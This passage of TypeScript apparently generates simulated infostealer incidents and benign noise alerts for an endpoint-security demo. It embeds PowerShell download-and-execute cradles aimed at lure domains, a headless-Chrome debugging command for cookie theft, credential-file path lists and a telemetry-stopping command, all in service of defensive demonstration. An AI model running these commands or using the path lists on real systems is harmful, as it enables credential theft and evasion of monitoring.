import type { Device, IncidentDetail, RuleMeta, RuleMode } from '@/api/types'
import { AISYAH, DANIEL, DAY, HOUR, MARCUS, MIN, NOW, PRIYA } from './fleet'
import { Story } from './story'
import { chance, int, pick, rand, sha256 } from './rng'

const CHROME = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'
const EDGE = 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'
const EXPLORER = 'C:\\Windows\\explorer.exe'
const PS = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
const CMD = 'C:\\Windows\\System32\\cmd.exe'
const MS = 'Microsoft Windows'
const GOOGLE = 'Google LLC'

function home(d: Device) {
  return `C:\\Users\\${(d.logged_on_user ?? 'user').split('\\').pop()}`
}
function chromeData(d: Device, profile = 'Default') {
  return `${home(d)}\\AppData\\Local\\Google\\Chrome\\User Data\\${profile}`
}

export interface Ctx {
  rules: Map<string, RuleMeta>
  modes: (d: Device) => Record<string, RuleMode>
  dev: (hostname: string) => Device
}

function story(ctx: Ctx, host: string, t0: number) {
  const d = ctx.dev(host)
  return new Story(d, t0, ctx.rules, ctx.modes(d))
}

/** Lumma via ClickFix → Chrome passwords/cookies + MetaMask → DPAPI → Telegram dead-drop → contained by ST-04. */
function lumma(ctx: Ctx): IncidentDetail {
  const s = story(ctx, 'SAL-LT-022', NOW - 2 * HOUR - 14 * MIN)
  const d = s.dev
  const lure = `powershell -w h -nop -c "iex(irm 'https://cdn-verify-human.top/c.txt')" # ✅ I am not a robot - Cloudflare Verification ID: 4821-77`
  const ex = s.proc(null, EXPLORER, 'C:\\Windows\\Explorer.EXE', { dt: -3 * HOUR, pid: 4312, signer: MS, quiet: true })
  const regEv = s.ev(ex, 0, {
    type: 'registry_set',
    key: `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU`,
    value_name: 'a',
    data: `${lure}\\1`,
  })
  const ps = s.proc(ex, PS, lure, { dt: 380, signer: MS, exitDt: 9_200 })
  s.alert(ex, 420, 'ST-10', 'Explorer recorded a command pasted into the Win+R Run dialog that starts hidden PowerShell and downloads a script.', { evidence: [regEv] })
  const dnsLure = s.dns(ps, 900, 'cdn-verify-human.top', ['172.67.182.41'])
  const cLure = s.connect(ps, 1_050, '172.67.182.41', 443, 'cdn-verify-human.top', { bytes: 612 })
  s.alert(ps, 1_100, 'ST-11', 'PowerShell was started from Explorer with a fake "I am not a robot" comment, a hidden window and a download cradle.', {
    evidence: [s.events.find((e) => e.guid === ps.guid)!, dnsLure, cLure],
  })
  const dropPath = `${home(d)}\\AppData\\Local\\Temp\\VCRuntime_x64\\Setup_x64.exe`
  s.file(ps, 6_200, dropPath, 'create')
  const sha = 'e3b14f7d0a2c9b8e61f04c5d2a7b9e8c3f6a1d0b5e4c7a9f2d8b6e1c0a3f5d7b'
  const st = s.proc(ps, dropPath, `"${dropPath}"`, { dt: 6_900, sha, size: 9_418_752, motw: 3, exitDt: 14_100 })
  s.alert(st, 7_100, 'ST-12', 'An unsigned program downloaded a few seconds earlier ran from the Temp folder.', {
    evidence: [s.events.find((e) => e.guid === st.guid)!],
  })
  const dTg = s.dns(st, 7_800, 'api.telegram.org', ['149.154.167.220'])
  const cTg = s.connect(st, 7_950, '149.154.167.220', 443, 'api.telegram.org', { bytes: 1_204 })
  s.alert(st, 8_100, 'ST-14', 'Setup_x64.exe, which is not a browser or Telegram, contacted api.telegram.org — Lumma uses a Telegram channel as a dead-drop to find its server.', {
    evidence: [dTg, cTg],
  })
  const reads = [
    s.file(st, 9_000, `${chromeData(d)}\\Login Data`),
    s.file(st, 9_040, `${chromeData(d)}\\Network\\Cookies`),
    s.file(st, 9_060, `${home(d)}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State`),
    s.file(st, 9_110, `${chromeData(d)}\\Web Data`),
    s.file(st, 9_400, `${chromeData(d)}\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn\\000003.log`),
  ]
  s.alert(st, 9_500, 'ST-01', 'Setup_x64.exe read saved Chrome passwords, cookies and the MetaMask wallet extension.', {
    data: ['browser_passwords', 'browser_cookies', 'crypto_wallet'],
    evidence: reads,
  })
  const dp = s.ev(st, 10_200, { type: 'dpapi_unprotect', description: 'Google Chrome' })
  s.alert(st, 10_300, 'ST-03', 'Setup_x64.exe asked Windows to decrypt Chrome’s master key, which only Chrome itself should do.', {
    data: ['browser_master_key'],
    evidence: [dp],
  })
  const c2 = s.connect(st, 13_400, '185.208.158.114', 443, null, { bytes: 2_202_009 })
  s.alert(st, 13_600, 'ST-04', 'Setup_x64.exe read browser secrets, decrypted them and uploaded 2.1 MB to 185.208.158.114 within 4 seconds.', {
    data: ['browser_passwords', 'browser_cookies', 'browser_master_key', 'crypto_wallet'],
    evidence: [reads[0], dp, c2],
    auto: [
      { action: { type: 'kill_process', pid: st.pid, guid: st.guid, tree: true }, detail: 'Terminated 1 process', after: 380 },
      { action: { type: 'block_destination', ip: '185.208.158.114', port: 443, image: null, ttl_secs: 86400 }, detail: 'WFP filter added for 24 h', after: 520 },
      { action: { type: 'quarantine_file', path: dropPath, sha256: sha }, detail: 'Moved to quarantine vault', after: 900 },
    ],
  })
  s.connect(st, 14_000, '185.208.158.114', 443, null, { blocked: true })
  s.manualAction(21 * MIN, DANIEL, { type: 'collect_triage' }, 'Grab autoruns and recent events before reimage', 'Triage package uploaded (4.2 MB)')
  return s.finalize({
    status: 'in_progress',
    assignee: DANIEL,
    contained: true,
    storyline: `The user pasted a fake CAPTCHA command into the **Win+R Run dialog**. Hidden PowerShell downloaded \`Setup_x64.exe\` into **Temp** and ran it. The program looked up its server through a **Telegram dead-drop**, read **saved Chrome passwords, cookies and the MetaMask wallet**, decrypted Chrome's key with DPAPI and **uploaded 2.1 MB** to \`185.208.158.114\` about 4 seconds later. Kestrel killed it, blocked the destination and quarantined the file.

**Assume the data left the device**: the upload finished before the kill landed. Revoke the user's sessions and move the wallet funds.`,
    approve: [
      { text: 'Isolate the host until the checklist is complete', action: { type: 'isolate_host', allow_ips: [] } },
      { text: 'Scan the user’s Temp folder for other droppers', action: { type: 'scan', path: `${home(d)}\\AppData\\Local\\Temp` } },
    ],
    manual: [{ text: 'Move rules ST-10 and ST-11 to Protect in the Default policy (they ran in Audit here)' }],
    comments: [
      { author: DANIEL, dt: 18 * MIN, body: 'Called the user — they followed a "verify you are human" page from a Google Ads result for a shipping-rate calculator. Asked them not to log in anywhere from this laptop.' },
      { author: PRIYA, dt: 34 * MIN, body: 'M365 sessions revoked from Entra. Still need the MetaMask wallet moved — finance confirmed it holds the team’s test funds only.' },
    ],
    statusChanges: [{ dt: 16 * MIN, title: 'Status → In progress, assigned to Daniel Tan', actor: DANIEL.name }],
  })
}

/** Vidar 2.0 smash-and-grab from a padded fake invoice, killed by ST-02 before upload. */
function vidar(ctx: Ctx): IncidentDetail {
  const s = story(ctx, 'FIN-LT-003', NOW - 26 * HOUR - 40 * MIN)
  const d = s.dev
  const ex = s.proc(null, EXPLORER, 'C:\\Windows\\Explorer.EXE', { dt: -5 * HOUR, pid: 5120, signer: MS, quiet: true })
  const img = `${home(d)}\\Downloads\\Invoice_Oct2026\\Invoice_Oct2026.exe`
  const v = s.proc(ex, img, `"${img}"`, { dt: 0, signed: 'invalid', signer: 'Adobe Inc.', size: 514_850_816, motw: 3, exitDt: 6_300 })
  s.alert(v, 200, 'ST-12', 'A 491 MB program with a forged “Adobe Inc.” signature ran from an extracted ZIP in Downloads.', {
    evidence: [s.events.find((e) => e.guid === v.guid)!],
    auto: [
      { action: { type: 'suspend_process', pid: v.pid, guid: v.guid }, detail: 'Suspended for verdict (5 s window)', after: 120 },
      { action: { type: 'resume_process', pid: v.pid, guid: v.guid }, detail: 'No Protect rule fired in the window; resumed', after: 5_150 },
    ],
  })
  const base = home(d)
  const paths: [string, number][] = [
    [`${chromeData(d)}\\Login Data`, 5_400],
    [`${chromeData(d)}\\Network\\Cookies`, 5_420],
    [`${base}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data`, 5_430],
    [`${base}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\k3x9.default-release\\logins.json`, 5_470],
    [`${base}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\k3x9.default-release\\key4.db`, 5_480],
    [`${base}\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C\\maps`, 5_520],
    [`${base}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\000005.ldb`, 5_560],
    [`${base}\\AppData\\Roaming\\FileZilla\\sitemanager.xml`, 5_600],
    [`${base}\\.aws\\credentials`, 5_640],
  ]
  const ev = paths.map(([p, t]) => s.file(v, t, p))
  s.alert(v, 5_700, 'ST-01', 'Invoice_Oct2026.exe read Chrome, Edge and Firefox credential stores.', {
    data: ['browser_passwords', 'browser_cookies'],
    evidence: ev.slice(0, 5),
  })
  s.alert(v, 5_900, 'ST-02', 'Invoice_Oct2026.exe touched 6 different kinds of secrets (browsers, Telegram, Discord, FileZilla, AWS) in under a second.', {
    data: ['browser_passwords', 'browser_cookies', 'telegram', 'discord', 'ftp_client', 'cloud_token'],
    evidence: ev,
    auto: [
      { action: { type: 'kill_process', pid: v.pid, guid: v.guid, tree: true }, detail: 'Terminated 1 process', after: 240 },
      { action: { type: 'block_image_network', image: img, ttl_secs: null }, detail: 'WFP block for image', after: 300 },
    ],
  })
  s.dns(v, 6_150, 'steamcommunity.com', ['23.199.63.179'])
  s.connect(v, 6_200, '23.199.63.179', 443, 'steamcommunity.com', { blocked: true })
  s.manualAction(40 * MIN, AISYAH, { type: 'quarantine_file', path: img, sha256: s.nodes[1].sha256 }, 'Quarantine the dropper', 'Moved to quarantine vault')
  s.manualAction(42 * MIN, AISYAH, { type: 'scan', path: `${base}\\Downloads` }, 'Check for other payloads in the ZIP', 'YARA-X scan: 214 files, 0 matches')
  return s.finalize({
    status: 'resolved',
    classification: 'true_positive',
    assignee: AISYAH,
    contained: true,
    storyline: `\`Invoice_Oct2026.exe\` from an emailed ZIP ran from **Downloads**. It was padded to 491 MB to slip past scanners and carried a forged Adobe signature. Kestrel paused it for 5 seconds and then let it go, because nothing else had fired yet. Within **one second** it read **browser passwords and cookies**, the **Telegram** session, the **Discord** token, **FileZilla** logins and **AWS keys**. Kestrel killed it and blocked its network before it reached its Steam dead-drop. **No upload was seen.** Treat these secrets as exposed anyway.`,
    approve: [],
    manual: [{ text: 'Report the phishing email to the mail gateway and purge copies', done: true }],
    comments: [
      { author: AISYAH, dt: 35 * MIN, body: 'Matches Vidar 2.0 (Steam dead-drop, multithreaded grab). Email came from a compromised vendor mailbox; 3 other recipients did not open it.' },
      { author: AISYAH, dt: 5 * HOUR, body: 'All sessions revoked, AWS key rotated by Engineering, user re-enrolled after reimage. Closing.' },
    ],
    statusChanges: [
      { dt: 30 * MIN, title: 'Status → In progress', actor: AISYAH.name },
      { dt: 5 * HOUR + 2 * MIN, title: 'Status → Resolved (true positive)', actor: AISYAH.name },
    ],
  })
}

/** App-Bound Encryption bypass through headless remote debugging, still running (Audit). */
function abe(ctx: Ctx): IncidentDetail {
  const s = story(ctx, 'MKT-LT-005', NOW - 47 * MIN)
  const d = s.dev
  const ex = s.proc(null, EXPLORER, 'C:\\Windows\\Explorer.EXE', { dt: -6 * HOUR, pid: 3988, signer: MS, quiet: true })
  const helper = `${home(d)}\\AppData\\Roaming\\SyncHelper\\synchelper.exe`
  const h = s.proc(ex, helper, `"${helper}" --background`, { dt: -2 * HOUR, size: 3_211_264 })
  const tmpProfile = `${home(d)}\\AppData\\Local\\Temp\\chr_6f1a`
  const cmd = `"${CHROME}" --headless=new --remote-debugging-port=9222 --user-data-dir="${tmpProfile}" --window-position=-32000,-32000 --no-first-run`
  const c = s.proc(h, CHROME, cmd, { dt: 0, signer: GOOGLE })
  s.alert(c, 300, 'ST-05', 'synchelper.exe started Chrome headless with remote debugging on port 9222 and a throwaway profile, a known way to bypass Chrome’s App-Bound Encryption.', {
    data: ['browser_cookies'],
    evidence: [s.events.find((e) => e.guid === c.guid)!],
  })
  s.file(h, 1_400, `${chromeData(d)}\\Network\\Cookies`, 'read')
  s.file(h, 1_500, `${tmpProfile}\\Default\\Network\\Cookies`, 'write')
  const lo = s.connect(h, 2_900, '127.0.0.1', 9222, 'localhost')
  s.alert(h, 3_000, 'ST-06', 'synchelper.exe connected to the Chrome debugging port and could read every cookie through the DevTools protocol.', {
    data: ['browser_cookies'],
    evidence: [lo],
  })
  const dn = s.dns(h, 6_100, 'pub-3f2c19ad7e.r2.dev', ['104.18.2.161'])
  const up = s.connect(h, 6_300, '104.18.2.161', 443, 'pub-3f2c19ad7e.r2.dev', { bytes: 186_440 })
  s.alert(h, 6_500, 'ST-14', 'synchelper.exe uploaded 182 KB to a Cloudflare R2 file-drop bucket.', { evidence: [dn, up] })
  return s.finalize({
    status: 'open',
    contained: false,
    storyline: `\`synchelper.exe\`, an unsigned program hiding in **AppData\\Roaming**, started Chrome **off-screen in headless mode with remote debugging** on a copied profile. It then connected to the debugging port, where it can read every session cookie without decrypting anything. About 3 seconds later it **uploaded 182 KB to an R2 file-drop**.

These rules are in **Audit** under the Default policy, so **nothing was stopped and the program is still running**. Approve the kill and quarantine below, then revoke the user's web sessions.`,
    approve: [
      { text: 'Kill synchelper.exe and its children', action: { type: 'kill_process', pid: h.pid, guid: h.guid, tree: true } },
      { text: 'Quarantine synchelper.exe', action: { type: 'quarantine_file', path: helper, sha256: h.sha256 } },
      { text: 'Block 104.18.2.161 for this device', action: { type: 'block_destination', ip: '104.18.2.161', port: 443, image: null, ttl_secs: 604800 } },
      { text: 'Isolate the host', action: { type: 'isolate_host', allow_ips: [] } },
    ],
    manual: [{ text: 'Find how synchelper.exe was installed (check the Run key and Downloads history)' }],
  })
}

/** Benign: SyncBackPro nightly backup reads browser profiles. */
function backupFp(ctx: Ctx): IncidentDetail {
  const s = story(ctx, 'IT-LT-002', NOW - 4 * DAY - 7 * HOUR)
  const d = s.dev
  const svc = s.proc(null, 'C:\\Windows\\System32\\services.exe', 'C:\\Windows\\system32\\services.exe', { dt: -9 * DAY, pid: 812, signer: MS, quiet: true, user: 'NT AUTHORITY\\SYSTEM', integrity: 'system' })
  const sbp = 'C:\\Program Files\\2BrightSparks\\SyncBackPro\\SyncBackPro.exe'
  const b = s.proc(svc, sbp, `"${sbp}" -m "Nightly profile backup"`, { dt: 0, signer: '2BrightSparks Pte Ltd', signed: 'valid', exitDt: 41 * MIN })
  const r1 = s.file(b, 12 * MIN, `${chromeData(d)}\\Login Data`, 'read')
  const r2 = s.file(b, 12 * MIN + 30, `${chromeData(d)}\\Network\\Cookies`, 'read')
  s.alert(b, 12 * MIN + 100, 'ST-01', 'SyncBackPro.exe, signed by 2BrightSparks, copied the Chrome password and cookie databases.', {
    data: ['browser_passwords', 'browser_cookies'],
    evidence: [r1, r2],
  })
  const r3 = s.file(b, 14 * MIN, `${home(d)}\\AppData\\Roaming\\KeePassXC\\keepassxc.ini`, 'read')
  const r4 = s.file(b, 14 * MIN + 20, `${home(d)}\\Documents\\Vault\\it-team.kdbx`, 'read')
  s.alert(b, 14 * MIN + 80, 'ST-01', 'SyncBackPro.exe copied a KeePassXC password vault.', { data: ['password_manager'], evidence: [r3, r4] })
  return s.finalize({
    status: 'dismissed',
    classification: 'benign',
    assignee: MARCUS,
    contained: true,
    storyline: `The nightly **SyncBackPro** backup, a signed program from Program Files started by a scheduled service, copied the Chrome profile and a KeePassXC vault to the NAS. This is expected. The files were copied as-is, with no DPAPI decrypt and no upload outside the network.`,
    manual: [{ text: 'Add a signer exclusion for “2BrightSparks Pte Ltd” on ST-01', done: true }],
    comments: [{ author: MARCUS, dt: 9 * HOUR, body: 'Our own backup job. Added signer exclusion scoped to ST-01 only, expires in 90 days so we revisit it.' }],
    statusChanges: [{ dt: 9 * HOUR + 2 * MIN, title: 'Status → Dismissed (benign)', actor: MARCUS.name }],
  })
}

/** VoidStealer-style debugger key capture against Chrome, killed by ST-07. */
function debugKey(ctx: Ctx): IncidentDetail {
  const s = story(ctx, 'EXE-LT-002', NOW - 5 * HOUR - 12 * MIN)
  const d = s.dev
  const ex = s.proc(null, EXPLORER, 'C:\\Windows\\Explorer.EXE', { dt: -8 * HOUR, pid: 6020, signer: MS, quiet: true })
  const chrome = s.proc(ex, CHROME, `"${CHROME}"`, { dt: -3 * HOUR, signer: GOOGLE })
  const img = `${home(d)}\\AppData\\Local\\Temp\\7zS4A1C.tmp\\update.exe`
  const u = s.proc(ex, img, `"${img}" /silent`, { dt: 0, size: 1_840_640, exitDt: 2_300 })
  const da = s.ev(u, 1_900, { type: 'debug_attach', target_pid: chrome.pid, target_guid: chrome.guid, target_image: CHROME, granted_access: 0x1fffff })
  const tc = s.ev(u, 2_050, { type: 'thread_context', target_pid: chrome.pid, target_guid: chrome.guid, target_image: CHROME, granted_access: 0x1a })
  s.alert(u, 2_100, 'ST-07', 'update.exe attached a debugger to Chrome and set hardware breakpoints to catch the App-Bound master key.', {
    data: ['browser_master_key'],
    evidence: [da, tc],
    auto: [{ action: { type: 'kill_process', pid: u.pid, guid: u.guid, tree: true }, detail: 'Terminated 1 process', after: 180 }],
  })
  s.alert(u, 2_150, 'ST-12', 'update.exe ran unsigned from a 7-Zip self-extractor folder in Temp.', { evidence: [s.events.find((e) => e.guid === u.guid)!] })
  return s.finalize({
    status: 'open',
    assignee: PRIYA,
    contained: true,
    storyline: `\`update.exe\`, unpacked by a 7-Zip self-extractor into **Temp**, **attached a debugger to Chrome** and set breakpoints on its threads. This is the VoidStealer technique for catching Chrome's App-Bound key in plaintext. Kestrel killed it **180 ms** later. No credential files were read and no upload was seen. The browser key may still have been captured, so revoke sessions as a precaution.`,
    approve: [{ text: 'Collect a triage package', action: { type: 'collect_triage' } }],
    manual: [{ text: 'Ask the executive’s assistant where the “update” came from' }],
  })
}

/** Canary tripwire on HR-DT-003; host isolated automatically. */
function canary(ctx: Ctx): IncidentDetail {
  const s = story(ctx, 'HR-DT-003', NOW - 3 * DAY - 2 * HOUR)
  const d = s.dev
  const ex = s.proc(null, EXPLORER, 'C:\\Windows\\Explorer.EXE', { dt: -2 * HOUR, pid: 4404, signer: MS, quiet: true })
  const img = `${home(d)}\\Downloads\\Payslip_Viewer_2026.exe`
  const p = s.proc(ex, img, `"${img}"`, { dt: 0, motw: 3, size: 6_291_456, exitDt: 3_400 })
  const ev = s.file(p, 3_100, `${home(d)}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 7\\Login Data`)
  s.alert(p, 3_200, 'ST-16', 'Payslip_Viewer_2026.exe opened a decoy Chrome password file that only malware would look for.', {
    evidence: [ev],
    auto: [
      { action: { type: 'kill_process', pid: p.pid, guid: p.guid, tree: true }, detail: 'Terminated 1 process', after: 150 },
      { action: { type: 'isolate_host', allow_ips: [] }, detail: 'Host isolated; only the Kestrel server is reachable', after: 600 },
    ],
  })
  s.alert(p, 3_250, 'ST-12', 'An unsigned program downloaded from the internet ran from Downloads.', { evidence: [s.events.find((e) => e.guid === p.guid)!] })
  s.manualAction(50 * MIN, AISYAH, { type: 'collect_triage' }, 'Before reimage', 'Triage package uploaded (3.8 MB)')
  return s.finalize({
    status: 'in_progress',
    assignee: AISYAH,
    contained: true,
    storyline: `\`Payslip_Viewer_2026.exe\` from **Downloads** went straight for a **decoy Chrome password file** that Kestrel planted. No real program reads it. The agent killed it and **isolated the desktop**. Real browser files were not touched before the kill. Release the host once the reimage is done.`,
    approve: [{ text: 'Release the host from isolation', action: { type: 'release_host' } }],
    manual: [{ text: 'Reimage HR-DT-003', done: false }, { text: 'Warn HR about fake payslip emails', done: true }],
    comments: [{ author: AISYAH, dt: 45 * MIN, body: 'Delivered by WhatsApp Web link, not email. Reimage booked for Thursday.' }],
  })
}

/** Acreed-style BSC RPC dead-drop + RegAsm hollowing. */
function acreed(ctx: Ctx): IncidentDetail {
  const s = story(ctx, 'OPS-DT-012', NOW - 9 * HOUR - 30 * MIN)
  const ex = s.proc(null, EXPLORER, 'C:\\Windows\\Explorer.EXE', { dt: -2 * HOUR, pid: 2280, signer: MS, quiet: true })
  const ldr = 'C:\\ProgramData\\IntelGraphics\\igfxCUIServiceN.exe'
  const l = s.proc(ex, ldr, `"${ldr}"`, { dt: 0, size: 2_457_600 })
  const dq = s.dns(l, 1_200, 'bsc-dataseed1.binance.org', ['172.64.149.37'])
  const rpc = s.connect(l, 1_400, '172.64.149.37', 8545, 'bsc-dataseed1.binance.org', { bytes: 412 })
  s.alert(l, 1_500, 'ST-14', 'igfxCUIServiceN.exe queried a Binance Smart Chain RPC node on port 8545, the way Acreed finds its command server.', { evidence: [dq, rpc] })
  const ra = 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe'
  const r = s.proc(l, ra, `"${ra}"`, { dt: 2_600, signer: 'Microsoft Corporation', exitDt: 4_300 })
  const cn = s.connect(r, 3_900, '91.92.243.17', 443, null, { bytes: 0 })
  s.alert(r, 4_000, 'ST-13', 'RegAsm.exe was started without arguments by an unsigned program and immediately connected out: it is likely hollowed.', {
    evidence: [s.events.find((e) => e.guid === r.guid)!, cn],
    auto: [{ action: { type: 'kill_process', pid: r.pid, guid: r.guid, tree: true }, detail: 'Terminated 1 process', after: 260 }],
  })
  return s.finalize({
    status: 'open',
    contained: false,
    storyline: `An unsigned \`igfxCUIServiceN.exe\` posing as an Intel driver ran from **ProgramData**. It looked up its server through a **Binance Smart Chain RPC call** and then started \`RegAsm.exe\` to hide inside it. Kestrel killed the hollowed RegAsm **before any credential access**. The loader itself is not covered by a Protect rule and **may still be running**.`,
    approve: [
      { text: 'Kill igfxCUIServiceN.exe', action: { type: 'kill_process', pid: l.pid, guid: l.guid, tree: true } },
      { text: 'Quarantine igfxCUIServiceN.exe', action: { type: 'quarantine_file', path: ldr, sha256: l.sha256 } },
    ],
  })
}

/** Custom SigmaHQ rule (DRL author shown) catches FileFix from Edge. */
function filefix(ctx: Ctx): IncidentDetail {
  const s = story(ctx, 'FIN-LT-021', NOW - 13 * HOUR)
  const ex = s.proc(null, EXPLORER, 'C:\\Windows\\Explorer.EXE', { dt: -4 * HOUR, pid: 3376, signer: MS, quiet: true })
  const e = s.proc(ex, EDGE, `"${EDGE}" --single-argument https://docs-share-portal.com/view?id=88213`, { dt: -2 * MIN, signer: 'Microsoft Corporation' })
  const cmd = `powershell.exe -c "iwr hxxps://docs-share-portal.com/d/a.ps1 | iex" # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx`
  const p = s.proc(e, PS, cmd, { dt: 0, signer: MS, exitDt: 900 })
  s.alert(p, 120, 'SIG-4be03877', 'Edge started PowerShell with a fake file path after "#" — the FileFix upload-dialog lure.', {
    evidence: [s.events.find((x) => x.guid === p.guid)!],
  })
  s.alert(p, 200, 'ST-11', 'PowerShell started from a browser with a download cradle and a disguising comment.', {
    evidence: [s.events.find((x) => x.guid === p.guid)!],
    auto: [{ action: { type: 'kill_process', pid: p.pid, guid: p.guid, tree: true }, detail: 'Terminated 1 process', after: 600 }],
  })
  return s.finalize({
    status: 'open',
    assignee: DANIEL,
    contained: true,
    storyline: `The user pasted a "file path" into an **Edge file-upload dialog**. It was really a PowerShell download cradle disguised with a \`#\` comment (**FileFix**). Kestrel killed PowerShell **0.8 s** later, before the script was fetched. Nothing else ran.`,
    manual: [{ text: 'Block docs-share-portal.com at the web proxy' }],
  })
}

/** Developer stopped the ETW session. */
function tamper(ctx: Ctx): IncidentDetail {
  const s = story(ctx, 'ENG-LT-019', NOW - 6 * DAY - 3 * HOUR)
  const ex = s.proc(null, EXPLORER, 'C:\\Windows\\Explorer.EXE', { dt: -3 * HOUR, pid: 2904, signer: MS, quiet: true })
  const term = 'C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.23.11752.0_x64__8wekyb3d8bbwe\\WindowsTerminal.exe'
  const wt = s.proc(ex, term, `"${term}"`, { dt: -10 * MIN, signer: 'Microsoft Corporation' })
  const c = s.proc(wt, CMD, '"C:\\Windows\\System32\\cmd.exe"', { dt: -9 * MIN, signer: MS, integrity: 'high' })
  const lm = s.proc(c, 'C:\\Windows\\System32\\logman.exe', 'logman stop KestrelTrace -ets', { dt: 0, signer: MS, integrity: 'high', exitDt: 300 })
  const t = s.ev(lm, 400, { type: 'tamper', kind: 'etw_session_stopped', detail: 'KestrelTrace stopped by logman.exe (PID ' + lm.pid + ')' })
  s.alert(lm, 450, 'TP-01', 'The Kestrel telemetry session was stopped from an elevated command prompt.', {
    evidence: [t],
    auto: [{ action: { type: 'apply_hardening' }, detail: 'Telemetry session restarted in 1.2 s', after: 1_200 }],
  })
  return s.finalize({
    status: 'resolved',
    classification: 'false_positive',
    assignee: MARCUS,
    contained: true,
    storyline: `A developer ran \`logman stop KestrelTrace\` from an **elevated** prompt and stopped Kestrel's telemetry session. The agent restarted it **1.2 s** later. The developer confirmed they were debugging their own ETW tooling.`,
    comments: [{ author: MARCUS, dt: 2 * HOUR, body: 'Confirmed with Rahul — testing an ETW profiler. Reminded the team that stopping Kestrel sessions pages IT.' }],
    statusChanges: [{ dt: 2 * HOUR + 1 * MIN, title: 'Status → Resolved (false positive)', actor: MARCUS.name }],
  })
}

// ---------------------------------------------------------------- background noise

interface Noise {
  rule: string
  host: (all: Device[]) => Device
  image: (d: Device) => string
  cmd?: (img: string) => string
  signer?: string | null
  signed?: 'valid' | 'unsigned' | 'invalid'
  summary: string
  status: 'resolved' | 'dismissed' | 'open'
  classification: 'benign' | 'false_positive' | 'true_positive'
  story: string
  data?: ('browser_passwords' | 'browser_cookies' | 'telegram')[]
}

const NOISE: Noise[] = [
  {
    rule: 'ST-12',
    host: (a) => pick(a.filter((d) => !d.hostname.startsWith('SRV') && !d.hostname.startsWith('ENG'))),
    image: (d) => `${home(d)}\\Downloads\\ZoomInstallerFull.exe`,
    signer: 'Zoom Communications, Inc.',
    signed: 'valid',
    summary: 'A per-user installer ran from Downloads for the first time in this organisation.',
    status: 'dismissed',
    classification: 'benign',
    story: 'A Zoom per-user installer ran from **Downloads**. It is signed by Zoom Communications and expected.',
  },
  {
    rule: 'ST-05',
    host: (a) => pick(a.filter((d) => d.hostname.startsWith('ENG'))),
    image: () => CHROME,
    cmd: (i) => `"${i}" --headless=new --remote-debugging-port=0 --user-data-dir=C:\\Users\\dev\\AppData\\Local\\Temp\\playwright_chromiumdev_profile-x7Kq`,
    signer: GOOGLE,
    signed: 'valid',
    summary: 'Chrome was started headless with remote debugging by node.exe (Playwright test run).',
    status: 'dismissed',
    classification: 'benign',
    story: 'An end-to-end test run started **headless Chrome** through Playwright. This is normal on developer machines.',
  },
  {
    rule: 'ST-14',
    host: (a) => pick(a.filter((d) => d.hostname.startsWith('SAL') || d.hostname.startsWith('MKT'))),
    image: (d) => `${home(d)}\\AppData\\Roaming\\Telegram Desktop\\Telegram.exe`,
    signer: 'Telegram FZ-LLC',
    signed: 'valid',
    summary: 'Telegram.exe connected to api.telegram.org.',
    status: 'dismissed',
    classification: 'false_positive',
    story: 'The **Telegram Desktop** client talked to its own API. The rule fired because the client lives in AppData.',
  },
  {
    rule: 'ST-09',
    host: (a) => pick(a.filter((d) => d.hostname.startsWith('IT'))),
    image: () => 'C:\\Program Files\\KeePassXC\\KeePassXC.exe',
    signer: 'KeePassXC Team',
    signed: 'valid',
    summary: 'KeePassXC loaded nss3.dll to import Firefox logins.',
    status: 'dismissed',
    classification: 'benign',
    story: 'An IT admin imported Firefox logins into **KeePassXC**.',
    data: ['browser_passwords'],
  },
  {
    rule: 'TP-05',
    host: (a) => pick(a.filter((d) => d.tags.includes('laptop'))),
    image: () => 'C:\\Program Files\\Kestrel\\kestrel-agent.exe',
    signer: 'Kestrel Labs Pte. Ltd.',
    signed: 'valid',
    summary: 'No heartbeat for 47 minutes while the device was not rebooted.',
    status: 'resolved',
    classification: 'benign',
    story: 'The laptop **went to sleep** in a bag. The heartbeat gap matches the lid-close event.',
  },
  {
    rule: 'ST-12',
    host: (a) => pick(a.filter((d) => d.hostname.startsWith('OPS'))),
    image: (d) => `${home(d)}\\AppData\\Local\\Temp\\RarSFX0\\label-printer-setup.exe`,
    signed: 'unsigned',
    signer: null,
    summary: 'An unsigned label printer driver installer ran from a RAR self-extractor in Temp.',
    status: 'resolved',
    classification: 'benign',
    story: 'A warehouse lead installed a **label-printer driver** from the vendor’s site. The file is unsigned but matches the vendor’s published hash.',
  },
  {
    rule: 'ST-01',
    host: (a) => pick(a.filter((d) => d.hostname.startsWith('FIN') || d.hostname.startsWith('HR'))),
    image: () => 'C:\\Program Files\\1Password\\app\\8\\1Password.exe',
    signer: 'AgileBits Inc.',
    signed: 'valid',
    summary: '1Password read Chrome saved passwords during an import.',
    status: 'dismissed',
    classification: 'benign',
    story: 'The user imported saved Chrome passwords into **1Password**.',
    data: ['browser_passwords'],
  },
]

function noise(ctx: Ctx, all: Device[]): IncidentDetail[] {
  const out: IncidentDetail[] = []
  const reviewers = [DANIEL, AISYAH, MARCUS, PRIYA]
  for (let i = 0; i < 26; i++) {
    const n = NOISE[i % NOISE.length]
    const d = n.host(all)
    const daysAgo = 0.3 + rand() * 13.4
    const s = new Story(d, NOW - daysAgo * DAY, ctx.rules, ctx.modes(d))
    const ex = s.proc(null, EXPLORER, 'C:\\Windows\\Explorer.EXE', { dt: -HOUR, pid: int(2000, 7000), signer: MS, quiet: true })
    const img = n.image(d)
    const p = s.proc(ex, img, n.cmd ? n.cmd(img) : `"${img}"`, { dt: 0, signer: n.signer, signed: n.signed, exitDt: int(4, 300) * 1000 })
